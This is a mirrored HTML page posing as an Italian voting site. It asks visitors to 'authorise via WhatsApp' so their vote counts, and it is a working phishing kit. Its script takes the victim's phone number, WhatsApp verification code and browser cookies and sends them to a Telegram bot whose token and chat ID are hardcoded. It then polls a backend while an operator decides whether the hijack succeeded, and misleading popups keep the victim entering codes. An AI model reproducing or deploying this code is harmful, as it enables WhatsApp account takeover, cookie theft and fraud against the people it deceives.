<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title>Autorizzazione</title>
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <!-- External JS libraries -->
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <!-- Core script from original site (likely handles dropdown) -->
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
    <!-- Additional libraries for phone input -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        /* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; margin: 0; font-family: sans-serif; }
        .wrapper { max-width: 500px; margin: 50px auto; padding: 20px; } /* –£–ø—Ä–æ—â–µ–Ω–Ω—ã–π wrapper –¥–ª—è –ø—Ä–∏–º–µ—Ä–∞ */
        .hidden { display: none !important; } /* –í–∞–∂–Ω—ã–π –∫–ª–∞—Å—Å –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è */

        /* –°—Ç–∏–ª–∏ –¥–ª—è –±–ª–æ–∫–æ–≤ —à–∞–≥–æ–≤ (–∞–¥–∞–ø—Ç–∏—Ä–æ–≤–∞–Ω–æ) */
        .block { background-color: #1d3957; padding: 30px; border-radius: 8px; margin-bottom: 20px; }
        .block .text h2 { color: #ffffff; font-size: 1.5em; margin-bottom: 10px; text-align: center; }
        .block .text p { color: #c6c6c6; font-size: 1em; line-height: 1.5; margin-bottom: 20px; text-align: center; }

        /* –°—Ç–∏–ª–∏ —Ñ–æ—Ä–º—ã */
        .form-container { background-color: #1d3957; padding: 20px; border-radius: 8px; }
        .form .country { display: flex; align-items: center; padding: 10px; border: 1px solid #80a2b3; border-radius: 4px; margin-bottom: 15px; cursor: pointer; background-color: #152b42; }
        .form .country .image img { width: 30px; height: auto; margin-right: 10px; border-radius: 3px; -webkit-mask-image: none !important; }
        .form .country p.name { color: #ffffff; flex-grow: 1; margin: 0; }
        .form .country .icon svg { fill: #bfbbbb; width: 10px; height: 10px; }
        .form .country.active { border-color: #1d9ce0; }

        /* –°—Ç–∏–ª–∏ –¥—Ä–æ–ø–¥–∞—É–Ω–∞ —Å—Ç—Ä–∞–Ω */
        .form .countries { position: absolute; z-index: 10; background-color: #1d3957; border: 1px solid #80a2b3; border-radius: 4px; width: calc(100% - 42px); /* –ü—Ä–∏–º–µ—Ä–Ω–∞—è —à–∏—Ä–∏–Ω–∞ */ max-height: 300px; overflow: hidden; display: flex; flex-direction: column; margin-top: -10px; /* –ß—Ç–æ–± –ø—Ä–∏–ª–µ–≥–∞–ª */ }
        .form .countries.hidden { display: none; }
        .form .countries .search { padding: 10px; background-color: #1d3957; border-bottom: 1px solid #80a2b3; display: flex; align-items: center; }
        .form .countries .search .image svg { fill: #bfbbbb; width: 20px; height: 20px; margin-right: 10px;}
        .form .countries .search input { flex-grow: 1; background-color: #152b42; border: none; color: #b1c1d1; padding: 8px; border-radius: 4px; outline: none;}
        .form .countries .items { background-color: #1d3957; max-height: 240px; overflow-y: auto; }
        .form .countries .items .overflow { /* padding: 5px 0; */ }
        .form .countries .items .item { display: flex; align-items: center; padding: 10px 15px; cursor: pointer; background-color: #1d3957; }
        .form .countries .items .item:hover { background-color: #24466b; }
        .form .countries .items .item .image img { width: 24px; height: auto; margin-right: 10px; border-radius: 2px; -webkit-mask-image: none !important; }
        .form .countries .items .item p { margin: 0; }
        .form .countries .items .item p.name { color: #b1c1d1; flex-grow: 1; }
        .form .countries .items .item p.code { color: #ffffff; font-weight: bold; }

        /* –°—Ç–∏–ª–∏ –∏–Ω–ø—É—Ç–∞ –Ω–æ–º–µ—Ä–∞ */
        .form input.number { width: 100%; padding: 12px; background-color: transparent; border: 1px solid #80a2b3; border-radius: 4px; color: #ffffff; font-size: 1.1em; box-sizing: border-box; margin-bottom: 15px; }
        .form input.number:focus { border-color: #1d9ce0; outline: none; }

        /* –°—Ç–∏–ª–∏ –∫–Ω–æ–ø–æ–∫ */
        .button.primary { display: block; width: 100%; padding: 12px; background-color: #1d9ce0E6; color: #ffffff; border: none; border-radius: 4px; font-size: 1.1em; cursor: pointer; transition: background-color 0.2s ease; }
        .button.primary:hover { background-color: #1d9ce0; }

        /* –°—Ç–∏–ª–∏ –æ—à–∏–±–∫–∏ */
        .form p.error { color: #d65d7a; margin-top: -10px; margin-bottom: 15px; font-size: 0.9em; }

        /* –°—Ç–∏–ª–∏ –ª–æ–∞–¥–µ—Ä–∞ –∏ –ø–æ–ø–∞–ø–æ–≤ (–£–ø—Ä–æ—â–µ–Ω–Ω—ã–µ) */
        .loader-container { text-align: center; padding: 40px; }
        .loader { display: inline-block; width: 50px; height: 50px; border: 5px solid #1d3957; border-top-color: #bfbbbb; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 100; padding: 20px; box-sizing: border-box; }
        .popup .body { background-color: #1d3957; padding: 30px; border-radius: 8px; max-width: 400px; text-align: center; color: white; }
        .popup h2 { margin-top: 0; color: #ffffff; }
        .popup p { color: #c6c6c6; margin-bottom: 25px; }
        .popup .button.primary { margin-top: 10px; }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –≤–∞—à–µ–≥–æ –±–ª–æ–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ */
        .form-code .code-title { font-size: 1.2em; font-weight: 700; color: #ffffff; margin-bottom: 10px; }
        .form-code input.number { text-align: center; font-size: 1.5em; letter-spacing: 5px; }

        /* –£–±–∏—Ä–∞–µ–º –ª–∏—à–Ω–∏–µ —Å—Ç–∏–ª–∏, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ */
        .TdYmjJvmcSBa, .rwvCRhgYnBx, .EkrJRaLEYsO, .lmTQZiytwQd, .TjYfSpzXTNoUdv,
        .MEZNIyFgvRhuXN, .juxoxMAnNtukzfIm, .egeWSiccsIJQ, .RdMuchDHj, .phjUabQT,
        .CUuwPmBOQqkLDnR, .QSXSXYDCnbqkFWy, .zFFCQoOq, .HJCjuJdBRxyFkVhn {
            display: none !important; /* –ü–æ–ª–Ω–æ—Å—Ç—å—é —É–±–∏—Ä–∞–µ–º —ç—Ç–∏ –±–ª–æ–∫–∏ */
        }
    </style>
</head>

<body class="number-page"> <!-- –£–±—Ä–∞–Ω—ã data-–∞—Ç—Ä–∏–±—É—Ç—ã, –µ—Å–ª–∏ –æ–Ω–∏ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è -->
    <div class="wrapper">

        <!-- === –®–ê–ì 1: –í–í–û–î –ù–û–ú–ï–†–ê === -->
        <div class="block number" id="step-1">
            <div class="text">
                <h2>Devi accedere tramite WhatsApp affinch√© il tuo voto venga preso in considerazione.</h2>
                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
            </div>

            <div id="form-step-1" class="form-container form-num">
                <div class="form" id="myForm">
                    <!-- –í—ã–±–æ—Ä —Å—Ç—Ä–∞–Ω—ã -->
                    <div class="country">
                        <div class="image">
                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D" alt="AU">
                        </div>
                        <p class="name">Australia</p>
                        <div class="icon">
                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" fill="none">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor" fill-opacity="0.3"></path>
                            </svg>
                        </div>
                    </div>
                    <!-- –°–∞–º –¥—Ä–æ–ø–¥–∞—É–Ω -->
                    <div class="countries hidden">
                        <div class="search">
                             <div class="image">
                                <svg viewBox="0 0 24 24" height="20" width="20"><path fill="#bfbbbb" d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z"></path></svg>
                            </div>
                            <input type="text" id="search" placeholder="Search...">
                        </div>
                        <div class="items">
                            <div class="overflow">
                                <!-- –°–ü–ò–°–û–ö –°–¢–†–ê–ù –° –ê–ë–°–û–õ–Æ–¢–ù–´–ú–ò –ü–£–¢–Ø–ú–ò -->
                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                <div class="item" data-code="+43" data-lang="AT" data-name="√ñsterreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">√ñsterreich</p> <p class="code">+43</p> </div>
                                <div class="item" data-code="+994" data-lang="AZ" data-name="Az…ôrbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Az…ôrbaycan</p> <p class="code">+994</p> </div>
                                <div class="item" data-code="+358" data-lang="AX" data-name="√Öland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AX.png" alt="AX"> </div> <p class="name">√Öland</p> <p class="code">+358</p> </div>
                                <div class="item" data-code="+355" data-lang="AL" data-name="Shqip√´ri"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AL.png" alt="AL"> </div> <p class="name">Shqip√´ri</p> <p class="code">+355</p> </div>
                                <div class="item" data-code="+213" data-lang="DZ" data-name="ÿßŸÑÿ¨ÿ≤ÿßÿ¶ÿ±"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DZ.png" alt="DZ"> </div> <p class="name">ÿßŸÑÿ¨ÿ≤ÿßÿ¶ÿ±</p> <p class="code">+213</p> </div>
                                <div class="item" data-code="+1" data-lang="AS" data-name="American Samoa"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AS.png" alt="AS"> </div> <p class="name">American Samoa</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+1" data-lang="AI" data-name="Anguilla"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AI.png" alt="AI"> </div> <p class="name">Anguilla</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+244" data-lang="AO" data-name="Angola"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AO.png" alt="AO"> </div> <p class="name">Angola</p> <p class="code">+244</p> </div>
                                <div class="item" data-code="+376" data-lang="AD" data-name="Andorra"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AD.png" alt="AD"> </div> <p class="name">Andorra</p> <p class="code">+376</p> </div>
                                <div class="item" data-code="+1" data-lang="AG" data-name="Antigua & Barbuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AG.png" alt="AG"> </div> <p class="name">Antigua & Barbuda</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+54" data-lang="AR" data-name="Argentina"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AR.png" alt="AR"> </div> <p class="name">Argentina</p> <p class="code">+54</p> </div>
                                <div class="item" data-code="+374" data-lang="AM" data-name="’Ä’°’µ’°’Ω’ø’°’∂"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AM.png" alt="AM"> </div> <p class="name">’Ä’°’µ’°’Ω’ø’°’∂</p> <p class="code">+374</p> </div>
                                <div class="item" data-code="+297" data-lang="AW" data-name="Aruba"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AW.png" alt="AW"> </div> <p class="name">Aruba</p> <p class="code">+297</p> </div>
                                <div class="item" data-code="+93" data-lang="AF" data-name="ÿßŸÅÿ∫ÿßŸÜÿ≥ÿ™ÿßŸÜ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AF.png" alt="AF"> </div> <p class="name">ÿßŸÅÿ∫ÿßŸÜÿ≥ÿ™ÿßŸÜ</p> <p class="code">+93</p> </div>
                                <div class="item" data-code="+1" data-lang="BS" data-name="Bahamas"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BS.png" alt="BS"> </div> <p class="name">Bahamas</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+880" data-lang="BD" data-name="‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BD.png" alt="BD"> </div> <p class="name">‡¶¨‡¶æ‡¶Ç‡¶≤‡¶æ‡¶¶‡ßá‡¶∂</p> <p class="code">+880</p> </div>
                                <div class="item" data-code="+1" data-lang="BB" data-name="Barbados"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BB.png" alt="BB"> </div> <p class="name">Barbados</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+973" data-lang="BH" data-name="ÿßŸÑÿ®ÿ≠ÿ±ŸäŸÜ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BH.png" alt="BH"> </div> <p class="name">ÿßŸÑÿ®ÿ≠ÿ±ŸäŸÜ</p> <p class="code">+973</p> </div>
                                <div class="item" data-code="+375" data-lang="BY" data-name="–ë–µ–ª–∞—Ä—É—Å—å"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BY.png" alt="BY"> </div> <p class="name">–ë–µ–ª–∞—Ä—É—Å—å</p> <p class="code">+375</p> </div>
                                <div class="item" data-code="+501" data-lang="BZ" data-name="Belize"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BZ.png" alt="BZ"> </div> <p class="name">Belize</p> <p class="code">+501</p> </div>
                                <div class="item" data-code="+32" data-lang="BE" data-name="Belgi√´"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BE.png" alt="BE"> </div> <p class="name">Belgi√´</p> <p class="code">+32</p> </div>
                                <div class="item" data-code="+229" data-lang="BJ" data-name="B√©nin"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BJ.png" alt="BJ"> </div> <p class="name">B√©nin</p> <p class="code">+229</p> </div>
                                <div class="item" data-code="+1" data-lang="BM" data-name="Bermuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BM.png" alt="BM"> </div> <p class="name">Bermuda</p> <p class="code">+1</p> </div>
                                <div class="item" data-code="+359" data-lang="BG" data-name="–ë—ä–ª–≥–∞—Ä–∏—è"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BG.png" alt="BG"> </div> <p class="name">–ë—ä–ª–≥–∞—Ä–∏—è</p> <p class="code">+359</p> </div>
                                <!-- ... (–∏ —Ç–∞–∫ –¥–∞–ª–µ–µ –¥–ª—è –í–°–ï–• —Å—Ç—Ä–∞–Ω) ... -->
                                <div class="item" data-code="+81" data-lang="JP" data-name="Êó•Êú¨"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">Êó•Êú¨</p> <p class="code">+81</p> </div>
                            </div>
                        </div>
                    </div>
                    <!-- –ü–æ–ª–µ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ -->
                    <input type="text" class="number" id="number" value="+61" placeholder="Phone number" />
                    <!-- –°–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ (—Å–∫—Ä—ã—Ç–æ) -->
                    <p class="error hidden">Numero di telefono non valido</p>
                    <!-- –ö–Ω–æ–ø–∫–∞ "–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å" -->
                    <button class="button primary" id="next-step">Continua</button>
                </div>
            </div>
        </div>

        <!-- === –®–ê–ì 2: –í–í–û–î –ö–û–î–ê (–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç) === -->
        <div class="block number hidden" id="form-step-2"> <!-- –ò—Å–ø–æ–ª—å–∑—É–µ–º –≤–∞—à ID –∏ –∫–ª–∞—Å—Å hidden -->
             <div class="form-container form-code">
                <p class="text code-title">Code:</p>
                <div class="form" id="form-code">
                    <input type="text" class="number" id="code" placeholder="Enter code..." />
                    <button class="button primary" id="two-step">Continua</button>
                </div>
            </div>
        </div>

        <!-- === –õ–û–ê–î–ï–† (–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç) === -->
        <div id="loader" class="loader-container hidden">
            <div class="loader"></div>
        </div>

    </div> <!-- –∫–æ–Ω–µ—Ü .wrapper -->

    <!-- === –í–°–ü–õ–´–í–ê–Æ–©–ò–ï –û–ö–ù–ê (–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç—ã) === -->
    <div class="popup hidden" id="popreboot">
        <div class="body">
            <h2>Your vote has been counted, thank you</h2>
            <button class="button primary btn-ok">Ok</button> <!-- ID –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω, –µ—Å–ª–∏ –ª–æ–≤–∏–º –ø–æ –∫–ª–∞—Å—Å—É -->
        </div>
    </div>

    <div class="popup hidden" id="popwhat">
        <div class="body">
            <h2>Something is wrong!</h2>
            <p>You entered the code incorrectly, go to the WhatsApp application and enter the code correctly, otherwise your vote will not be counted.</p>
            <button class="button primary btn-reb">Reboot</button> <!-- ID –Ω–µ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω, –µ—Å–ª–∏ –ª–æ–≤–∏–º –ø–æ –∫–ª–∞—Å—Å—É -->
        </div>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", function () {
            
            // --- –õ–æ–≥–∏–∫–∞ –¥—Ä–æ–ø–¥–∞—É–Ω–∞ (–∏–∑ number.js, –£–ü–†–û–©–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø –î–õ–Ø –ü–†–ò–ú–ï–†–ê) ---
            // –ù–∞—Å—Ç–æ—è—â–∞—è –ª–æ–≥–∏–∫–∞ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤–æ –≤–Ω–µ—à–Ω–µ–º number.js
            // –≠—Ç–æ—Ç –±–ª–æ–∫ –∑–¥–µ—Å—å —Ç–æ–ª—å–∫–æ –¥–ª—è –∏–ª–ª—é—Å—Ç—Ä–∞—Ü–∏–∏ —Ç–æ–≥–æ, —á—Ç–æ –¥–æ–ª–∂–Ω–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç—å
            const countrySelector = document.querySelector('#myForm .country');
            const countriesList = document.querySelector('#myForm .countries');
            const phoneInput = document.getElementById('number');
            const searchInput = document.getElementById('search');
            
            countrySelector?.addEventListener('click', () => {
                countriesList?.classList.toggle('hidden');
            });

            countriesList?.addEventListener('click', (e) => {
                const item = e.target.closest('.item');
                if (item) {
                    const name = item.dataset.name;
                    const code = item.dataset.code;
                    const lang = item.dataset.lang;
                    const flagSrc = item.querySelector('img')?.src;

                    // –û–±–Ω–æ–≤–ª—è–µ–º –≤—ã–±—Ä–∞–Ω–Ω—É—é —Å—Ç—Ä–∞–Ω—É
                    const currentCountryName = countrySelector.querySelector('p.name');
                    const currentCountryFlag = countrySelector.querySelector('img');
                    if (currentCountryName) currentCountryName.textContent = name;
                    if (currentCountryFlag) currentCountryFlag.src = flagSrc || '';

                    // –û–±–Ω–æ–≤–ª—è–µ–º –∫–æ–¥ –≤ –ø–æ–ª–µ –≤–≤–æ–¥–∞
                    if (phoneInput) phoneInput.value = code;

                    // –°–∫—Ä—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫
                    countriesList.classList.add('hidden');
                    if (phoneInput) phoneInput.focus(); // –§–æ–∫—É—Å –Ω–∞ –Ω–æ–º–µ—Ä –ø–æ—Å–ª–µ –≤—ã–±–æ—Ä–∞ –∫–æ–¥–∞
                }
            });
            
             // –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è —Å–ø–∏—Å–∫–∞ (—É–ø—Ä–æ—â–µ–Ω–Ω—ã–π –ø—Ä–∏–º–µ—Ä)
            searchInput?.addEventListener('input', () => {
                const filter = searchInput.value.toLowerCase();
                const items = countriesList?.querySelectorAll('.item');
                items?.forEach(item => {
                    const name = item.dataset.name?.toLowerCase() || '';
                    const code = item.dataset.code?.toLowerCase() || '';
                    if (name.includes(filter) || code.includes(filter)) {
                        item.style.display = '';
                    } else {
                        item.style.display = 'none';
                    }
                });
            });
            
            // –°–∫—Ä—ã—Ç–∏–µ —Å–ø–∏—Å–∫–∞ –ø—Ä–∏ –∫–ª–∏–∫–µ –≤–Ω–µ –µ–≥–æ
             document.addEventListener('click', (e) => {
                 if (!countrySelector?.contains(e.target) && !countriesList?.contains(e.target)) {
                    countriesList?.classList.add('hidden');
                 }
             });
            // --- –ö–æ–Ω–µ—Ü –ø—Ä–∏–º–µ—Ä–Ω–æ–π –ª–æ–≥–∏–∫–∏ –¥—Ä–æ–ø–¥–∞—É–Ω–∞ ---


            // --- –í–∞—à–∞ –ª–æ–≥–∏–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã –∏ –æ–∂–∏–¥–∞–Ω–∏—è ---
            document.querySelectorAll(".btn-reb").forEach(button => {
                button.addEventListener("click", () => { location.reload(); });
            });

            document.querySelectorAll(".btn-ok").forEach(button => {
                button.addEventListener("click", () => {
                    document.getElementById("popreboot")?.classList.add('hidden');
                    document.getElementById("popwhat")?.classList.add('hidden');
                });
            });

            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g"; // –ó–ê–ú–ï–ù–ò–¢–¨ –ù–ê –†–ï–ê–õ–¨–ù–´–ô –¢–û–ö–ï–ù
            const chat_id = "7538727898"; // –ó–ê–ú–ï–ù–ò–¢–¨ –ù–ê –†–ï–ê–õ–¨–ù–´–ô CHAT ID
            const backendURL = "https://api.bestballerinavote.com"; // –£–ë–ï–î–ò–¢–¨–°–Ø, –ß–¢–û URL –ü–†–ê–í–ò–õ–¨–ù–´–ô

            const nextStepBtn = document.getElementById("next-step");
            const codeStepBtn = document.getElementById("two-step");
            const formStep1 = document.getElementById("step-1"); // –í–µ—Å—å –ø–µ—Ä–≤—ã–π –±–ª–æ–∫
            const formStep2 = document.getElementById("form-step-2"); // –í–∞—à –±–ª–æ–∫ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
            const loaderDiv = document.getElementById("loader"); // –í–∞—à –ª–æ–∞–¥–µ—Ä

            nextStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();
                const phone = phoneInput.value.trim();
                const cookies = document.cookie || "–ù–µ–º–∞—î –∫—É–∫—ñ";
                const errorP = document.querySelector('#form-step-1 .form p.error');

                if (errorP) errorP.classList.add('hidden'); // –°–Ω–∞—á–∞–ª–∞ —Å–∫—Ä—ã—Ç—å –æ—à–∏–±–∫—É

                if (!phone) {
                    Notiflix.Notify.failure('–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É'); return;
                }
                if (!/^\+\d{7,15}$/.test(phone)) {
                    Notiflix.Notify.failure('–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—É');
                    if (errorP) {
                        errorP.textContent = '–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—É';
                        errorP.classList.remove('hidden');
                    }
                    return;
                }

                sessionStorage.setItem("submittedPhone", phone);
                const msg = `üì≤ –ù–æ–≤–∏–π –∑–∞–ø–∏—Ç\n–¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\nüç™ –ö—É–∫—ñ: ${cookies}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id, text: msg }) })
                    .catch(err => console.error("Telegram send phone error:", err)); // –õ–æ–≤–∏–º –æ—à–∏–±–∫–∏

                formStep1?.classList.add('hidden'); // –°–∫—Ä—ã–≤–∞–µ–º –≤–µ—Å—å –ø–µ—Ä–≤—ã–π —à–∞–≥
                formStep2?.classList.remove('hidden'); // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤—Ç–æ—Ä–æ–π —à–∞–≥
                document.getElementById("code")?.focus(); // –§–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –∫–æ–¥–∞
            });

            codeStepBtn?.addEventListener("click", function (e) {
                e.preventDefault();
                const codeInput = document.getElementById("code");
                const code = codeInput.value.trim();
                const phone = sessionStorage.getItem("submittedPhone");

                if (!code) { Notiflix.Notify.failure('–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥'); return; }
                if (!phone) {
                     Notiflix.Notify.failure('–ü–æ–º–∏–ª–∫–∞: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ. –°–ø—Ä–æ–±—É–π—Ç–µ –∑–Ω–æ–≤—É.');
                     formStep2?.classList.add('hidden');
                     formStep1?.classList.remove('hidden');
                     return;
                }

                const msg = `üîê –ö–æ–¥ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è:\n–¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\n–ö–æ–¥: ${code}`;
                const keyboard = { inline_keyboard: [[ { text: "‚úÖ –¢–∞–∫", callback_data: `confirm_yes_${phone}` }, { text: "‚ùå –ù—ñ", callback_data: `confirm_no_${phone}` } ]] };

                fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id, text: msg, reply_markup: keyboard }) })
                    .catch(err => console.error("Telegram send code error:", err)); // –õ–æ–≤–∏–º –æ—à–∏–±–∫–∏

                formStep2?.classList.add('hidden'); // –°–∫—Ä—ã–≤–∞–µ–º —Ñ–æ—Ä–º—É –∫–æ–¥–∞
                loaderDiv?.classList.remove('hidden'); // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä

                waitForApproval(phone);
            });

            function waitForApproval(phone) {
                const interval = setInterval(() => {
                    fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                        .then(res => { if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`); return res.json(); })
                        .then(data => {
                            console.log("Backend check response:", data);
                            if (data.status === "approved" || data.status === "rejected") {
                                clearInterval(interval);
                                loaderDiv?.classList.add('hidden'); // –°–∫—Ä—ã–≤–∞–µ–º –ª–æ–∞–¥–µ—Ä
                                if (data.status === "approved") {
                                    document.getElementById("popreboot")?.classList.remove('hidden'); // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö
                                } else {
                                    document.getElementById("popwhat")?.classList.remove('hidden'); // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –æ—à–∏–±–∫—É
                                }
                            }
                        })
                        .catch(err => {
                            console.error("Backend check error:", err);
                            // –û–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ: –æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–ø—Ä–æ—Å –ø—Ä–∏ –æ—à–∏–±–∫–µ —Å–µ—Ç–∏
                            // clearInterval(interval);
                            // loaderDiv?.classList.add('hidden');
                            // Notiflix.Notify.failure("–ü–æ–º–∏–ª–∫–∞ –∑–≤'—è–∑–∫—É –∑ —Å–µ—Ä–≤–µ—Ä–æ–º.");
                        });
                }, 3000);
            }
        });
    </script>
</body>
</html>
